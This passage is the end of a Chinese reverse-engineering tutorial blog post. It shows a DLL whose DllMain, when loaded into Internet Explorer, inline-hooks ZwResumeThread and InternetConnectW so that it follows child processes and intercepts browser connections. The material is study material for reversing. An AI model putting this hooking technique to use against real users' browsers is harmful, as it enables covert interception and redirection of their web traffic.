(PROC)NewInternetConnectW, g_pICW) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewInternetConnectW() : hook_by_code() failed!!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> hInt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">char</span>            *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">            <span class="built_in">DebugLog</span>(<span class="string">&quot;DllMain() : DLL_PROCESS_ATTACH\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, szCurProc, MAX_PATH);</span><br><span class="line">            p = <span class="built_in">strrchr</span>(szCurProc, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>( (p != <span class="literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="number">1</span>, <span class="string">&quot;iexplore.exe&quot;</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">DebugLog</span>(<span class="string">&quot;DllMain() : current process is [iexplore.exe]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 钩取 wininet!InternetConnectW() API 前先加载 wininet.dll</span></span><br><span class="line">                <span class="comment">// 预先加载 wininet.dll</span></span><br><span class="line">				<span class="comment">// 需要在相关进程的主线程开始之前拦截控制权，此时，我们要钩取的wininet.dll模块可能尚未加载。</span></span><br><span class="line">                <span class="keyword">if</span>( <span class="literal">NULL</span> == <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;wininet.dll&quot;</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">DebugLog</span>(<span class="string">&quot;DllMain() : LoadLibrary() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// hook</span></span><br><span class="line">            <span class="built_in">hook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, (PROC)NewZwResumeThread, g_pZWRT);</span><br><span class="line">            <span class="built_in">hook_by_code</span>(<span class="string">&quot;wininet.dll&quot;</span>, <span class="string">&quot;InternetConnectW&quot;</span>, (PROC)NewInternetConnectW, g_pICW);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">            <span class="built_in">DebugLog</span>(<span class="string">&quot;DllMain() : DLL_PROCESS_DETACH\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// unhook</span></span><br><span class="line">            <span class="built_in">unhook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>,  g_pZWRT);</span><br><span class="line">            <span class="built_in">unhook_by_code</span>(<span class="string">&quot;wininet.dll&quot;</span>, <span class="string">&quot;InternetConnectW&quot;</span>,  g_pICW);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2023/04/10/hvv-middle-ctf/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/03/29/re-part-5-2/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>


	<!-- comment -->
	
<section id="comment">
    <h2 class="title">留言</h2>

    <!-- 
    <div id="disqus_thread" class="ds-thread">
        <script type="text/javascript">
            /**
             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
             */
                /*
                 var disqus_config = function () {
                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 };
                 */
            (function() { // DON'T EDIT BELOW THIS LINE
                var d = document, s = d.createElement('script');

                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';

                s.setAttribute('data-timestamp', +new Date());
                (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
                Disqus.</a></noscript>
    </div> -->
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
        })
    </script>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-04-05 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/re-book/">re-book<span>11</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>

	<!-- copyright -->
	<div>
    <ul class="post-copyright">
      <li class="post-copyright-author">
      <strong>作者:  </strong>wd-z711</a>
      </li>
      <li class="post-copyright-link">
      <strong>文章链接:  </strong>
      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
      </li>
      <li class="post-copyright-license">
        <strong>版权声明:   </strong>
        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
        许可协议。转载请注明出处!
      </li>
    </ul>
  <div>
 	

		


</div><!-- row -->




	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2023 wd-z711
  
      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->

     <!-- <script type="text/javascript">
      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
      
      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
    </script> -->
    </p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
   </html>
